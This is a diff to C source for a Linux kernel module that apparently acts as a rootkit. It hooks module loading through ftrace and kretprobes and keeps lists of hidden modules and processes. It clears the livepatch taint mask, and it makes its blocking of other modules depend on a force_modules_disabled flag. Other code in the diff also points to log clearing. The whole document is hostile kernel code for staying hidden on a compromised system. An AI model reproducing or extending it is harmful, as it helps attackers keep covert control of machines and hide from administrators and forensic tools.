@@ -142,8 +142,8 @@ static struct task_struct *(*p_find_task_by_pid_ns)(pid_t nr, struct pid_namespa
 
 //static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;
 
-static int old_modules_disabled = 0;
-static int *p_modules_disabled = NULL;
+//static int old_modules_disabled = 0;
+//static int *p_modules_disabled = NULL;
 static struct list_head *p_modules = NULL;
 static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
 static bool (*p_kallsyms_show_value)(const struct cred *cred) = NULL;
@@ -1848,7 +1848,7 @@ static asmlinkage  ssize_t ftrace_msg_print_ext_body(char *buf, size_t size,
 static asmlinkage  struct module* (*real_layout_and_allocate)(struct load_info *info, int flags) = NULL;
 static asmlinkage  struct module* ftrace_layout_and_allocate(struct load_info *info, int flags)
 {
-	if (info && info->name && !is_hidden_module_name(info->name))
+	if (info && info->name && !is_hidden_module_name(info->name) && force_modules_disabled)
 		return ERR_PTR(-EPERM);
 
 	if (is_in_hidden_module_list(info->name))
@@ -2068,6 +2068,7 @@ static int ret_handler_do_init_module(struct kretprobe_instance *ri, struct pt_r
 	return 0;
 }
 
+#if 0
 static int entry_handler_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	if (*p_modules_disabled) {
@@ -2087,6 +2088,7 @@ static int ret_handler_init_module(struct kretprobe_instance *ri, struct pt_regs
 
 	return 0;
 }
+#endif
 
 static struct kretprobe krps[] = {
 	{
@@ -2115,6 +2117,7 @@ static struct kretprobe krps[] = {
 		.maxactive      = 20,
 	},
 
+#if 0
 	{
 		//syscall init_module
 		.kp.symbol_name = "__x64_sys_init_module",
@@ -2131,9 +2134,10 @@ static struct kretprobe krps[] = {
 		.data_size      = 0,
 		.maxactive      = 20,
 	},
+#endif
 };
 
-struct kretprobe *rps[] = {&krps[0], &krps[1], &krps[2], &krps[3], &krps[4]};
+struct kretprobe *rps[] = {&krps[0], &krps[1], &krps[2]/*, &krps[3], &krps[4] */};
 
 static struct klp_func funcs[] = {
 	{
@@ -2229,10 +2233,12 @@ static int livepatch_init(void)
 	if (!p_modules)
 		return -1;
 
+#if 0
 	p_modules_disabled = (int *)
 				kallsyms_lookup_name("modules_disabled");
 	if (!p_modules_disabled)
 		return -1;
+#endif
 
 	p_module_flags = (char *(*)(struct module *mod, char *buf))
 				kallsyms_lookup_name("module_flags");
@@ -2441,7 +2447,7 @@ static int livepatch_init(void)
 
 	clear_livepatch_tainted_mask();
 
-	*p_modules_disabled = force_modules_disabled;
+//	*p_modules_disabled = force_modules_disabled;
 //	print_hidden_proc_name();
 //	print_hidden_module_name();
 	//clear_klog();
